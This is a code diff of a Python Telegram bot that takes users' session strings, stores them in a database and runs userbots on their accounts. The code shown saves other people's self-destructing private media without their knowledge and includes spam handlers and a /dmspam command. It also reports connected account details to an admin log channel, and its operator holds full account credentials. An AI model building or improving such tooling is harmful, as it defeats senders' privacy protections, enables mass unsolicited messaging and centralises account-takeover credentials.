@@ -21,8 +21,8 @@ API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 MONGO_URI = os.getenv("MONGO_URI")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-LOG_CHANNEL_ID = -1002753939875
-ADMIN_ID = 7755789304
+LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
+ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))
 
 # --- Configure logging ---
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
@@ -76,24 +76,21 @@ async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
         upsert=True
     )
 
-    if session_type == "telethon":
-        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-    else:
-        client = PyroClient(
-            name=f"userbot_{user_id}",
-            session_string=session_string,
-            api_id=API_ID,
-            api_hash=API_HASH,
-            parse_mode=ParseMode.HTML
-        )
-
     try:
         if session_type == "telethon":
+            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
             await client.connect()
             if not await client.is_user_authorized():
                 await update.message.reply_text("❌ Session not authorized. Login needed.")
                 return
         else:
+            client = PyroClient(
+                name=f"userbot_{user_id}",
+                session_string=session_string,
+                api_id=API_ID,
+                api_hash=API_HASH,
+                parse_mode=ParseMode.HTML
+            )
             await client.start()
 
         me = await client.get_me()
@@ -112,17 +109,18 @@ async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text=f"✅ {session_type.capitalize()} session connected:\n• ID: `{me.id}`\n• Username: @{getattr(me, 'username', 'N/A')}"
         )
 
-        # --- Telethon Handlers ---
         if session_type == "telethon":
 
             @client.on(events.NewMessage(incoming=True))
             async def media_handler(event):
                 if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
                     try:
+                        sender = await event.get_sender()
+                        name = getattr(sender, 'username', getattr(sender, 'first_name', 'Unknown'))
                         await client.send_file(
                             "me",
                             event.media,
-                            caption=f"🕒 Saved disappearing media from {event.sender_id} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                            caption=f"🕒 Saved disappearing media from @{name} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                         )
                     except Exception as e:
                         logger.warning(f"[Telethon] Media save failed: {e}")
@@ -139,9 +137,7 @@ async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception as e:
                     await event.reply(f"❌ Spam failed: {e}")
 
-        # --- Pyrogram Handlers ---
         else:
-
             @client.on_message(pyro_filters.private & pyro_filters.media)
             async def pyrogram_handler(client, message):
                 if getattr(message, 'ttl_seconds', None):
@@ -169,21 +165,21 @@ async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception as e:
                     await message.reply(f"❌ Failed: {e}")
 
-        # --- Run Client ---
         async def run_client():
+            logger.info(f"[RUN] Starting {session_type} client for user {user_id}")
             if session_type == "telethon":
                 await client.run_until_disconnected()
             else:
                 await client.idle()
 
-        asyncio.create_task(run_client())
+        context.application.create_task(run_client())
         await update.message.reply_text("✅ Session connected and running.")
 
     except SessionPasswordNeededError:
         await update.message.reply_text("❌ 2FA enabled. Cannot connect this session.")
     except Exception as e:
-        logger.error(f"Session connection error: {e}")
-        await update.message.reply_text("❌ Failed to connect session.")
+        logger.exception("Session connection error:")
+        await update.message.reply_text("❌ Failed to connect session. Check logs.")
 
 # --- Bot-side /dmspam command ---
 async def dmspam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
